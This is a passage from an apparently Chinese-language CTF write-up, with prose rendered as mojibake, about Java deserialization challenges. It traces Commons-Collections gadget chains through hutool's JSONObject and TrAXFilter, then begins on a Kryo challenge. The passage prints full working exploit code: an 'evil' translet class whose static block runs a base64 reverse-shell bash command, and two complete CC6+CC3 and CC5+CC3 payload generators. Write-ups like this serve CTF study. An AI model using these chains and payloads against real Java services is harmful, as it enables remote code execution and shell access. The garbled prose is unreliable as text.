class_">String</span>[]&#123;e.toString()&#125;);<br>                myexpect.setTargetclass(e.getClass());<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    result = myexpect.getAnyexcept().toString();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                    <span class="hljs-type">Exception</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> var7;<br>                    result = ex.toString();<br>                &#125;<br>            &#125;<br><br>            response.write(result, ContentType.TEXT_PLAIN.toString());<br>        &#125;).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼ å‚<code>bugstr</code>ï¼Œå€¼ä¸ºbase64ç¼–ç åçš„åºåˆ—åŒ–å­—èŠ‚ï¼Œæ‰“ååºåˆ—åŒ–çš„ä½ç½®ä¹Ÿå¾ˆæ˜¾ç„¶ï¼Œä¹Ÿæ²¡é‡å†™ObjectInputStreamè¿™ç§åŠ WAFã€‚</p><p>ç°åœ¨å°±åªéœ€è¦æŠŠé“¾å­åˆ†æå‡ºæ¥å°±å¯ä»¥äº†ã€‚</p><h3 id="å‰åŠç¼åˆ-CC6"><a href="#å‰åŠç¼åˆ-CC6" class="headerlink" title="å‰åŠç¼åˆ-CC6"></a>å‰åŠç¼åˆ-CC6</h3><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œæ¥åˆ°ï¼š</p><p><code>cn.hutool.json.JSONObject.put</code>ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813000442240.png" alt="image-20240813000442240"></p><p>æ²¡å•¥ç‰¹æ®Šï¼Œå°±ä¸€ä¸ªæ™®é€šçš„é”®å€¼å¯¹èµ‹å€¼ã€‚</p><p>å…¶å®å¯ä»¥ç»“åˆCCé“¾ä¾èµ–æƒ³åˆ°CC6çš„lazymap.get()ç»å…¸æ–¹æ³•ï¼ˆå…¶å®CC3ä¹Ÿæ˜¯CC6æ”¹è‰¯è€Œæ¥çš„ï¼‰ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813002641896.png" alt="image-20240813002641896"></p><p>ä¸å¦¨è®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æœ</p><ul><li>super.mapæ˜¯ä¸€ä¸ªJSONObject</li><li>keyæ— æ‰€è°“</li><li>valueæ˜¯ä¸€ä¸ªTransformerçš„å­ç±»,å¦‚<code>ConstantTransformer</code></li></ul><p>å¦‚å…¶æ‰€ç¤ºï¼Œåªè¦iConstantæ˜¯ä¸ªObjectï¼Œæˆ‘ä»¬å°±èƒ½è°ƒç”¨ä»–çš„getteræ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813003154650.png" alt="image-20240813003154650"></p><p>åªè¦ä»¤ä¼ å…¥çš„mapä¸ºJSONObjectå³å¯è§¦å‘JSONObject#putï¼Œä¸Šé¢çš„åˆ†æå·²ç»å¾—çŸ¥valueçš„å€¼ä¹Ÿæ˜¯æˆ‘ä»¬é€šè¿‡ConstantTransformerå¯æ§çš„ï¼Œç”±æ­¤è°ƒç”¨åˆ°å®ƒçš„getteræ–¹æ³•ã€‚</p><p>é‚£ä¹ˆè¿™æ¡é“¾å­çš„å‰åŠéƒ¨åˆ†å°±é€šäº†ï¼ˆCC6ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>HashSet#readObject() =&gt;<br>HashMap#put() =&gt;<br>HashMap#hash() =&gt;<br>TiedMapEntry#hashCode() =&gt;<br>TiedMapEntry#getValue() =&gt;<br>LazyMap#get() =&gt;<br>cn.hutool.json.JSONObject.put<br></code></pre></td></tr></table></figure><h3 id="ååŠç¼åˆ-CC3"><a href="#ååŠç¼åˆ-CC3" class="headerlink" title="ååŠç¼åˆ-CC3"></a>ååŠç¼åˆ-CC3</h3><p>çœ‹çœ‹å¦ä¸€ä¸ªï¼š</p><p><code>com.app.Myexpect#getAnyexcept</code>ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813000748313.png" alt="image-20240813000748313"></p><p>ä½¿ç”¨ä¸€ä¸ªæ„é€ å™¨ï¼Œè§¦å‘å¯¹åº”ç±»çš„newInstance()æ–¹æ³•ã€‚</p><p>æ¬¸ï¼Ÿè¿™ä¸CC3å—ï¼Ÿèƒ½ç›´æ¥è”æƒ³åˆ°<code>TrAXFilter</code>ã€‚</p><p>LINKï¼š<a href="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/#CC3">Commons Collections - EddieMurphyâ€™s blog (eddiemurphy89.github.io)</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813001032892.png" alt="image-20240813001032892"></p><p>è¿™é‡Œç”¨åˆ°<code>TrAXFilter</code>çš„æ„é€ æ–¹æ³•ï¼Œå…¶å®ç®—æ˜¯åˆ°CC3ååŠæ®µï¼Œé‚£ä¹ˆåç»­é“¾å­å°±æœ‰äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">com.app.Myexpect#getAnyexcept =&gt;<br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾å“ªé‡Œè°ƒç”¨äº†<code>getAnyexcept</code>ï¼Œç»“åˆæç¤º<code>cn.hutool.json.JSONObject.put</code>-&gt;<code>com.app.Myexpect#getAnyexcept</code>å…¶å®ä¹Ÿå¾ˆç®€å•ã€‚</p><p>å®Œæ•´é“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>HashSet#readObject() =&gt;<br>HashMap#put() =&gt;<br>HashMap#hash() =&gt;<br>TiedMapEntry#hashCode() =&gt;<br>TiedMapEntry#getValue() =&gt;<br>LazyMap#get() =&gt;<br><br>cn.hutool.json.JSONObject.put =&gt;<br>com.app.Myexpect#getAnyexcept =&gt;<br><br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>å®Œç¾ã€‚</p><p>å…¶å®åˆ°è¿™é‡Œä¹Ÿèƒ½å‘ç°ï¼ŒCC5ä¹Ÿå¯ä»¥èµ°ï¼Œå› ä¸ºå‰åŠéƒ¨åˆ†ä¸å—å½±å“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>    BadAttributeValueExpException#readObject() =&gt;<br>    TiedMapEntry#toString() =&gt;<br>    LazyMap#get() =&gt;<br>    <br>cn.hutool.json.JSONObject.put =&gt;<br>com.app.Myexpect#getAnyexcept =&gt;<br><br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>evil.classï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC6+CC3-EXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_CC6_CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        entries.put(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> entries;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;k&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        innerMap.clear();<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iConstant&quot;</span>, myexpect);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        output.writeObject(expMap);<br>        output.flush();<br>        baos.flush();<br><br>        <span class="hljs-type">byte</span>[] data = baos.toByteArray();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">bugstr</span> <span class="hljs-operator">=</span> URLEncoder.encode(Base64.getEncoder().encodeToString(data));<br>        System.out.println(bugstr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC5+CC3-EXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_CC5_CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(entries, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bad</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(bad,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(bad);<br>        oos.close();<br><br>        <span class="hljs-type">byte</span>[] byteArray = baos.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedString</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br>        System.out.println(encodedString);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>GETä¼ å‚ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813010828414.png" alt="image-20240813010828414"></p><h2 id="CISCN2023-è¥¿å—-seaclouds"><a href="#CISCN2023-è¥¿å—-seaclouds" class="headerlink" title="[CISCN2023 è¥¿å—]seaclouds"></a>[CISCN2023 è¥¿å—]seaclouds</h2><p>è¿™é“é¢˜éå¸¸å…·æœ‰ä»£è¡¨æ€§ï¼Œæ‰“çš„æ˜¯Kryoååºåˆ—åŒ–å’ŒHessianåŸç”ŸJDKçš„POCã€‚</p><p>åˆšæŠŠKryoå’ŒHessianå­¦äº†å°±å†æ¥é‡æ¸©ä¸€ä¸‹è¿™é“é¢˜ç›®ã€‚</p><p>å®¡è®¡ä¸€ä¸‹æºç ï¼š</p><p>MessageController.java:</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151127498.png" alt="image-20240816151127498"></p><p>è®¿é—®æ ¹è·¯ç”±ä¼ å‚messageï¼Œ</p><p>é‚£ä¹ˆå®ƒä¼šè§£ç ä¸€ä¸ªç¡¬ç¼–ç çš„Base64å­—ç¬¦ä¸²ã€‚å¦‚æœ<code>message</code>å‚æ•°ä¸ä¸ºnullï¼Œé‚£ä¹ˆå®ƒä¼šå°è¯•è§£ç è¯¥å‚æ•°ã€‚å¦‚æœè§£ç å¤±è´¥ï¼Œå®ƒä¼šè§£ç å¦ä¸€ä¸ªç¡¬ç¼–ç çš„Base64å­—ç¬¦ä¸²ã€‚</p><p>è§£ç åçš„å­—èŠ‚æ•°ç»„è¢«ä¼ é€’ç»™<code>CodecMessageConverter</code>çš„<code>toMessage</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º<code>Message</code>å¯¹è±¡ã€‚ç„¶åï¼Œè¯¥æ–¹æ³•è¿”å›<code>Message</code>å¯¹è±¡çš„æœ‰æ•ˆè´Ÿè½½ã€‚</p><p>User.javaï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151153559.png" alt="image-20240816151153559"></p><p>å®šä¹‰äº†ä¸€äº›setterå’Œgetteræ–¹æ³•ï¼Œ</p><p>ä¾èµ–æœ‰Kryoï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151355223.png" alt="image-20240816151355223"></p><p>é‚£å…¥æ‰‹ç‚¹å°±æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders)<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">return</span> messagecode.getPayload();<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›toMessageæ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151643378.png" alt="image-20240816151643378"></p><p>å…³é”®åœ¨decodeï¼Œè·Ÿè¿›<code>AbstractKryoCodec#decode</code>æ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816155453265.png" alt="image-20240816155453265"></p><p>å†è·Ÿè¿›åˆ°<code>PojoCodec#deDecode</code>æ–¹æ³•ï¼š</p><p><img 